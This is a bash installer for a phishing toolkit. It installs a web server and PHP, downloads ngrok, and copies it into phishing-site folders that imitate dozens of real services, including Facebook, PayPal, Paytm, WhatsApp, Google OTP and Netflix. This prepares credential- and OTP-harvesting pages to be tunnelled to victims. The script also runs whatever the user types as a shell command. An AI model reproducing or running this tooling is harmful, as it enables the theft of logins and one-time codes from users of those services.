#!/bin/bash
echo ""
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m !!! MUST ROOT OTHERWISE SCRIPT NOT WORKING PROPERLY !!!    \e[0m'
sleep 3
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'
sudo apt-get install apache2 -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
systemctl start apache2
apt install xterm -y
apt install gnome-terminal -y
unzip ngrok-stable-linux-amd64.zip
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
cp -R ngrok sites/github/
cp -R ngrok sites/Hotstar-otp-bypass/
cp -R ngrok sites/instagram/
cp -R ngrok sites/Linkedin/
cp -R ngrok sites/Netflix/
cp -R ngrok sites/Paytm-Phishing/paytm/
cp -R ngrok sites/Paytm-Phishing/signup/
cp -R ngrok sites/spotify/
cp -R ngrok sites/whatsapp-phishing/
cp -R ngrok sites/facebook/
cp -R ngrok sites/google-otp/
cp -R ngrok sites/instafollow/
cp -R ngrok sites/ipfinder/
cp -R ngrok sites/ola-otpbypass/
cp -R ngrok sites/UberEats-Phishing/
cp -R ngrok sites/Zomato-Phishing/
cp -R ngrok sites/amazonsign/
cp -R ngrok sites/tiktok/
cp -R ngrok sites/phonepay/
cp -R ngrok sites/paypal/
cp -R ngrok sites/telegram/
cp -R ngrok sites/twitter/
cp -R ngrok sites/flipcart/
cp -R ngrok sites/wordpress/
cp -R ngrok sites/snapchat/
cp -R ngrok sites/protonmail/
cp -R ngrok sites/stackoverflow/
cp -R ngrok sites/ebay/
cp -R ngrok sites/twitch/
cp -R ngrok sites/ajio/
cp -R ngrok sites/cryptocurrency/
cp -R ngrok sites/mobikwik/
cp -R ngrok sites/pinterest/
chmod 7777 AdvPhishing.sh
clear
echo ""
echo ""
echo ""
read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
clear



